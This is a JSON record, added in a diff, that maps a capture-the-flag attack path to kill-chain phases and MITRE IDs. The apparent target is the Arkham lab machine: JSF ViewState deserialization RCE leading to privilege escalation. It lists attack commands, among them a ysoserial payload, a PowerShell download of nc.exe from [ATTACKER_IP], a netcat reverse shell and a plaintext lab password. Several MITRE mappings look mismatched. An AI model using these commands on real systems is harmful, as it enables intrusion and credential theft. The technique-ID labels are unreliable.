@@ -1,0 +1,176 @@
+{
+  "id": "ap-0003",
+  "title": "Java Deserialization (JSF ViewState) & Privilege Escalation via Saved Credentials",
+  "summary": "Exploiting an encrypted JavaServer Faces (JSF) ViewState deserialization vulnerability leading to RCE, followed by credential hunting within local backups and privilege escalation using Windows administrative shares.",
+  "attack_path_markdown": "### Step 1: Reconnaissance\nPerform initial network and service scanning using `nmap` and `ping` [1, 2].\n### Step 2: Resource Discovery and Decryption\nEnumerate SMB shares (`smbclient`, `smbmap`) and retrieve `attserver.zip` from ButShare [3, 4]. Brute force and decrypt the contained Luks image (`backup.image`) using specialized tools [5, 6].\n### Step 3: Key Discovery and Weaponization\nAnalyze the mounted file system to locate web application configuration files (e.g., `web.xml.back`) revealing the DES key and HMAC-SHA1 algorithm used for ViewState encryption [7, 8]. Generate a serialized Java payload (`ysoserial`) [9], and use a custom Python script incorporating `pyDes` and `hmac` to encrypt and Base64 encode the payload [10, 11].\n### Step 4: Exploitation and Initial Foothold\nInject the encrypted payload into the `javax.faces.ViewState` parameter via a POST request to achieve RCE [12]. Use RCE to download Netcat (`powershell iwr`) and establish a reverse shell connection as the user Alfred [13, 14].\n### Step 5: Privilege Escalation\nLocate and transfer a `backup.zip` file [15], extract the PST file, and use `readpst` to find an email containing an attached image with credentials for the high-privileged user 'Batman' [16]. Use `Invoke-Command` with these credentials to execute commands as Batman [17], allowing access to administrative shares (`net use`) and retrieval of the final flag [18, 19].",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Scanning the target system to identify the operating system, open ports, exposed services, and shared network resources.",
+      "actions": [
+        "Check machine activity using ICMP",
+        "Detect operating system (Windows based on TTL 127)",
+        "Scan all TCP ports and run service/version detection on open ports",
+        "Enumerate SMB shares using null session"
+      ],
+      "tools": ["ping", "nmap", "smbclient", "smbmap", "whatweb"],
+      "techniques": ["Network Service Scanning (T1046)", "File Share Discovery (T1135)"],
+      "mitre_ids": ["T1046", "T1135"],
+      "commands": [
+        "ping [IP]",
+        "nmap -p- [IP]",
+        "nmap -sV -sC -p [ports] -oN target [IP]",
+        "smbclient -L [IP] -N",
+        "smbmap -H [IP] -u 'null'"
+      ],
+      "indicators": ["TTL 127", "Open ports 80, 8080, 445", "Microsoft IIS/Tomcat service banners", "ButShare resource"],
+      "preconditions": "Network connectivity to the target host.",
+      "expected_outcome": "List of open ports and services; discovery of the 'ButShare' containing a ZIP file.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparing the exploit by decrypting a disk image to find system configurations, specifically retrieving the encryption key and algorithm necessary to manipulate the serialized web object.",
+      "actions": [
+        "Download and extract content from attserver.zip",
+        "Brute force the Luks password for backup.image",
+        "Mount the decrypted disk image",
+        "Analyze web application configuration files (Tomcat/MyFaces) to extract the encryption key and HMAC algorithm"
+      ],
+      "tools": ["unzip", "bruteforce-luks", "cryptsetup", "mount"],
+      "techniques": ["Decryption (T1560.001)", "Configuration File Discovery (T1564.007)"],
+      "mitre_ids": ["T1560.001", "T1564.007"],
+      "commands": [
+        "get attserver.zip (via smbclient)",
+        "unzip attserver.zip",
+        "bruteforce-luks -f [WORDLIST] backup.image",
+        "cryptsetup luksOpen backup.image arkhamdata (with password 'batman forever')",
+        "mount /dev/mapper/arkhamdata /mnt/arkhamdata"
+      ],
+      "indicators": ["Found 'batman forever' password", "Found 'myFaces.secret' key in web.xml.back", "Identified HMAC-SHA1 and DES algorithm for ViewState."],
+      "preconditions": "Access to the shared directory and a suitable wordlist for brute force.",
+      "expected_outcome": "Discovery of the DES encryption key and HMAC-SHA1 algorithm.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Generating the malicious serialized Java object (payload) and preparing it for delivery by encrypting and encoding it according to the target's requirements.",
+      "actions": [
+        "Generate a Java serialized payload using YSOSerial (CommonsCollections5 gadget)",
+        "Encrypt the payload using the discovered DES key and padding method",
+        "Sign the encrypted data using the HMAC-SHA1 algorithm",
+        "Base64 encode the final encrypted and signed payload"
+      ],
+      "tools": ["YSOSerial (java -jar)", "Custom Python script (pyDes/hashlib/base64)"],
+      "techniques": ["Server-Side Deserialization (T1203 - payload creation)", "Data Encoding (T1132)"],
+      "mitre_ids": ["T1203", "T1132"],
+      "commands": [
+        "java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c ping -n 1 [ATTACKER_IP]' > payload.bin",
+        "Custom Python script utilizes DES encryption mode CBC and PKCS5 padding [20, 21]"
+      ],
+      "indicators": ["Base64 encoded string containing AC ED 00 05 (Java serialized object magic numbers) after decryption."],
+      "preconditions": "Knowledge of the target's encryption key and algorithm.",
+      "expected_outcome": "An encrypted, signed, Base64-encoded serialized payload for command execution.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Executing the deserialization vulnerability by injecting the encrypted payload into the ViewState parameter via an HTTP POST request.",
+      "actions": [
+        "Send the crafted payload in the 'javax.faces.ViewState' parameter in a POST request",
+        "Confirm successful Remote Command Execution (RCE) via ICMP echo requests"
+      ],
+      "tools": ["Custom Python script (requests)", "tcpdump"],
+      "techniques": ["Exploitation of Web Serialized Data (T1203)", "Remote Code Execution (T1203)"],
+      "mitre_ids": ["T1203", "T1190"],
+      "commands": [
+        "Custom Python script sends POST request to /user/subscribe.faces [12]",
+        "Payload: 'cmd.exe /c ping -n 1 [ATTACKER_IP]' [22]",
+        "tcpdump -i [interface] icmp -n (to verify ping response) [22, 23]"
+      ],
+      "indicators": ["ICMP packets received from the target IP."],
+      "preconditions": "The target web application is vulnerable to Java deserialization and the encryption/signing is correctly reversed.",
+      "expected_outcome": "Remote Command Execution established.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establishing persistent, interactive access to the target system by transferring and executing a Netcat binary to obtain a reverse shell.",
+      "actions": [
+        "Use RCE to download Netcat executable from the attacker's host",
+        "Execute Netcat to connect back to the attacker's listener"
+      ],
+      "tools": ["PowerShell (iwr)", "Netcat (nc)", "Python HTTP server"],
+      "techniques": ["Ingress Tool Transfer (T1105)", "Reverse Shell (T1059.007)"],
+      "mitre_ids": ["T1105", "T1059.007"],
+      "commands": [
+        "powershell -c 'iwr -uri http://[ATTACKER_IP]/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe'",
+        "nc -lvp 443 (Attacker listener)",
+        "C:\\Windows\\Temp\\nc.exe -e cmd.exe [ATTACKER_IP] 443"
+      ],
+      "indicators": ["Interactive shell connection obtained as user 'Alfred'"],
+      "preconditions": "Successfully exploited RCE and the ability to download files via HTTP.",
+      "expected_outcome": "Initial foothold (reverse shell) on the target system as Alfred.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Utilizing the established reverse shell connection for post-exploitation enumeration and file transfer.",
+      "actions": [
+        "Navigate and search local user directories",
+        "Transfer backup files to attacker machine (using Base64 encoding due to system limitations)"
+      ],
+      "tools": ["Netcat Shell", "PowerShell commands (type, Set-Content, Get-Content)", "base64 (attacker side)"],
+      "techniques": ["Standard Application Layer Protocol (T1071.001)", "Data Transfer Size Limits (T1567.001)"],
+      "mitre_ids": ["T1071.001", "T1567.001"],
+      "commands": [
+        "dir C:\\Users\\Alfred\\Downloads\\backups",
+        "type C:\\Users\\Alfred\\Downloads\\backups\\backup.zip (followed by Base64 encoding/decoding steps) [24, 25]"
+      ],
+      "indicators": ["Discovery of backup.zip file."],
+      "preconditions": "Initial foothold established.",
+      "expected_outcome": "Successful acquisition of sensitive backup files for offline analysis.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Escalating privileges by extracting credentials from the backup file, and utilizing the new credentials to access privileged shares and retrieve the final flag.",
+      "actions": [
+        "Analyze the transferred PST file (Alfred@Arkham.local.ost) using specialized tools",
+        "Extract an image attachment containing credentials for user 'Batman'",
+        "Use the discovered credentials to execute commands as Batman (Privilege Escalation)",
+        "Abuse the Batman user's administrative rights to mount the C$ share and access the Administrator's desktop"
+      ],
+      "tools": ["readpst", "PowerShell (ConvertTo-SecureString, New-Object PSCredential, Invoke-Command)", "net use"],
+      "techniques": ["Credential Access via PST File (T1552.001)", "Remote Services: SMB/Admin Shares (T1021.002)", "Exploitation for Privilege Escalation (T1068)"],
+      "mitre_ids": ["T1552.001", "T1021.002", "T1068"],
+      "commands": [
+        "readpst [PST file]",
+        "$secpass = ConvertTo-SecureString \"[PASSWORD]\" -AsPlainText -Force [26]",
+        "$cred = New-Object System.Management.Automation.PSCredential(\"batman\", $secpass) [27]",
+        "Invoke-Command -Credential $cred -ScriptBlock { [COMMAND] } (Executing another reverse shell as Batman) [17, 28]",
+        "net use Z: \\\\127.0.0.1\\C$ (Used to map the administrative share to view the final flag) [18]"
+      ],
+      "indicators": ["Credential found (User: batman, Pass: zx#zx+dx!jun23)", "Access to Administrator's desktop and root flag."],
+      "preconditions": "Access to a backup containing privileged user data; successful extraction of credentials.",
+      "expected_outcome": "Full administrative access and successful retrieval of the final objective.",
+      "confidence": 0.9
+    }
+  ],
+  "tactics": ["Initial Access", "Privilege Escalation", "Credential Access", "Discovery"],
+  "techniques": ["Java Deserialization", "Data Decryption", "Admin Shares", "Credentials from Mail Storage"],
+  "mitre_ids": ["T1203", "T1552.001", "T1021.002", "T1560.001"],
+  "hosts": ["10.10.10.130", "Arkham"],
+  "privs_obtained": ["Alfred (Initial User)", "Batman (Local Administrator)"],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "Procedure involves multiple layers of data hiding and cryptography (Luks, DES/HMAC-SHA1) leading to initial RCE.",
+  "labels": ["attack_path", "java", "deserialization", "windows"]
+}
